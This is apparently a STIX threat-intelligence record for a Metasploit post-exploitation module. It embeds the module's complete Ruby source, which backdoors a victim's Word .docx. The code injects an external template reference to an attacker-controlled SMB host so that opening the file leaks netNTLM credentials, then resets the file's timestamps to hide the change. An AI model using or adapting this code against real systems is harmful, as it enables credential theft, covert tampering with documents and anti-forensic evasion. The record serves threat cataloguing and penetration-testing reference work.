{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--88751156-b1ee-423d-9dae-3b64113cdce7",
    "created": "2024-08-14T16:33:05.057484Z",
    "modified": "2024-08-14T16:33:05.057488Z",
    "name": "Windows Gather Microsoft Office Word UNC Path Injector",
    "description": " This module modifies a remote .docx file that will, upon opening, submit stored netNTLM credentials to a remote host. Verified to work with Microsoft Word 2003, 2007, 2010, and 2013. In order to get the hashes the auxiliary/server/capture/smb module can be used.  'License' => MSF_LICENSE 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/word_unc_injector.rb",
            "external_id": "word_unc_injector.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n#\n# Gems\n#\n\n# for extracting files\nrequire 'zip'\n\n#\n# Project\n#\n\n# for creating files\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Microsoft Office Word UNC Path Injector',\n        'Description' => %q{\n          This module modifies a remote .docx file that will, upon opening, submit\n          stored netNTLM credentials to a remote host. Verified to work with Microsoft\n          Word 2003, 2007, 2010, and 2013. In order to get the hashes the\n          auxiliary/server/capture/smb module can be used.\n        },\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://web.archive.org/web/20140527232608/http://jedicorp.com/?p=534' ]\n        ],\n        'Platform'\t=> ['win'],\n        'SessionTypes'\t=> ['meterpreter'],\n        'Author' => [\n          'SphaZ <cyberphaz[at]gmail.com>'\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              priv_fs_get_file_mace\n              priv_fs_set_file_mace\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptAddress.new('SMBHOST', [true, 'Server IP or hostname that the .docx document points to']),\n        OptString.new('FILE', [true, 'Remote file to inject UNC path into. ']),\n        OptBool.new('BACKUP', [true, 'Make local backup of remote file.', true]),\n      ]\n    )\n  end\n\n  # Store MACE values so we can set them later again.\n  def get_mace\n    begin\n      mace = session.priv.fs.get_file_mace(datastore['FILE'])\n      vprint_status('Got file MACE attributes!')\n    rescue StandardError\n      print_error(\"Error getting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!\")\n    end\n    return mace\n  end\n\n  # here we unzip into memory, inject our UNC path, store it in a temp file and\n  # return the modified zipfile name for upload\n  def manipulate_file(zipfile)\n    ref = '<w:attachedTemplate r:id=\"rId1\"/>'\n\n    rels_file_data = ''\n    rels_file_data << '<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>'\n    rels_file_data << '<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">'\n    rels_file_data << '<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/'\n    rels_file_data << \"attachedTemplate\\\" Target=\\\"file://\\\\\\\\#{datastore['SMBHOST']}\\\\normal.dot\\\" TargetMode=\\\"External\\\"/></Relationships>\"\n\n    zip_data = unzip_docx(zipfile)\n    if zip_data.nil?\n      return nil\n    end\n\n    # file to check for reference file we need\n    file_content = zip_data['word/settings.xml']\n    if file_content.nil?\n      print_error('Bad \"word/settings.xml\" file, check if it is a valid .docx.')\n      return nil\n    end\n\n    # if we can find the reference to our inject file, we don't need to add it and can just inject our unc path.\n    if !file_content.index('w:attachedTemplate r:id=\"rId1\"').nil?\n      vprint_status('Reference to rels file already exists in settings file, we dont need to add it :)')\n    else\n      # now insert the reference to the file that will enable our malicious entry\n      insert_one = file_content.index('<w:defaultTabStop')\n\n      if insert_one.nil?\n        insert_two = file_content.index('<w:hyphenationZone') # 2nd choice\n        if !insert_two.nil?\n          vprint_status('HypenationZone found, we use this for insertion.')\n          file_content.insert(insert_two, ref)\n        end\n      else\n        vprint_status('DefaultTabStop found, we use this for insertion.')\n        file_content.insert(insert_one, ref)\n      end\n\n      if insert_one.nil? && insert_two.nil?\n        print_error('Cannot find insert point for reference into settings.xml')\n        return nil\n      end\n\n      # update the files that contain the injection and reference\n      zip_data['word/settings.xml'] = file_content\n    end\n    zip_data['word/_rels/settings.xml.rels'] = rels_file_data\n    return zip_docx(zip_data)\n  end\n\n  # RubyZip sometimes corrupts the document when manipulating inside a\n  # compressed document, so we extract it with Zip::File into memory\n  def unzip_docx(zipfile)\n    vprint_status(\"Extracting #{datastore['FILE']} into memory.\")\n    zip_data = Hash.new\n    begin\n      Zip::File.open(zipfile) do |filezip|\n        filezip.each do |entry|\n          zip_data[entry.name] = filezip.read(entry)\n        end\n      end\n    rescue Zip::Error => e\n      print_error(\"Error extracting #{datastore['FILE']} please verify it is a valid .docx document.\")\n      return nil\n    end\n    return zip_data\n  end\n\n  # making the actual docx\n  def zip_docx(zip_data)\n    docx = Rex::Zip::Archive.new\n    zip_data.each_pair do |k, v|\n      docx.add_file(k, v)\n    end\n    return docx.pack\n  end\n\n  # We try put the mace values back to that of the original file\n  def set_mace(mace)\n    if !mace.nil?\n      vprint_status(\"Setting MACE value of #{datastore['FILE']} set to that of the original file.\")\n      begin\n        session.priv.fs.set_file_mace(datastore['FILE'], mace['Modified'], mace['Accessed'], mace['Created'], mace['Entry Modified'])\n      rescue StandardError\n        print_error(\"Error setting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!\")\n      end\n    end\n  end\n\n  def rhost\n    client.sock.peerhost\n  end\n\n  def run\n    # sadly OptPath does not work, so we check manually if it exists\n    if !file_exist?(datastore['FILE'])\n      print_error('Remote file does not exist!')\n      return\n    end\n\n    # get mace values so we can put them back after uploading. We do this first, so we have the original\n    # accessed time too.\n    file_mace = get_mace\n\n    # download the remote file\n    print_status(\"Downloading remote file #{datastore['FILE']}.\")\n    org_file_data = read_file(datastore['FILE'])\n\n    # store the original file because we need to unzip from disk because there is no memory unzip\n    if datastore['BACKUP']\n      # logs_dir = ::File.join(Msf::Config.local_directory, 'unc_injector_backup')\n      # FileUtils.mkdir_p(logs_dir)\n      # @org_file =  logs_dir + File::Separator + datastore['FILE'].split('\\\\').last\n      @org_file = store_loot(\n        'host.word_unc_injector.changedfiles',\n        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',\n        rhost,\n        org_file_data,\n        datastore['FILE']\n      )\n      print_status(\"Local backup kept at #{@org_file}\")\n      # Store information in note database so its obvious what we changed, were we stored the backup file..\n      note_string = \"Remote file #{datastore['FILE']} contains UNC path to #{datastore['SMBHOST']}. \"\n      note_string += \" Local backup of file at #{@org_file}.\"\n      report_note(\n        host: session.session_host,\n        type: 'host.word_unc_injector.changedfiles',\n        data: {\n          session_num: session.sid,\n          stype: session.type,\n          desc: session.info,\n          platform: session.platform,\n          via_payload: session.via_payload,\n          via_exploit: session.via_exploit,\n          created_at: Time.now.utc,\n          files_changed: note_string\n        }\n      )\n    else\n      @org_file = Rex::Quickfile.new('msf_word_unc_injector')\n    end\n\n    vprint_status(\"Written remote file to #{@org_file}\")\n    File.open(@org_file, 'wb') { |f| f.write(org_file_data) }\n\n    # Unzip, insert our UNC path, zip and return the data of the modified file for upload\n    injected_file = manipulate_file(@org_file)\n    if injected_file.nil?\n      return\n    end\n\n    # upload the injected file\n    write_file(datastore['FILE'], injected_file)\n    print_status('Uploaded injected file.')\n\n    # set mace values back to that of original\n    set_mace(file_mace)\n\n    # remove tmpfile if no backup is desired\n    if !datastore['BACKUP']\n      @org_file.close\n      begin\n        @org_file.unlink\n      rescue StandardError\n        nil\n      end\n    end\n\n    print_good(\"Done! Remote file #{datastore['FILE']} succesfully injected to point to #{datastore['SMBHOST']}\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_platforms": [
        "['win']"
    ]
}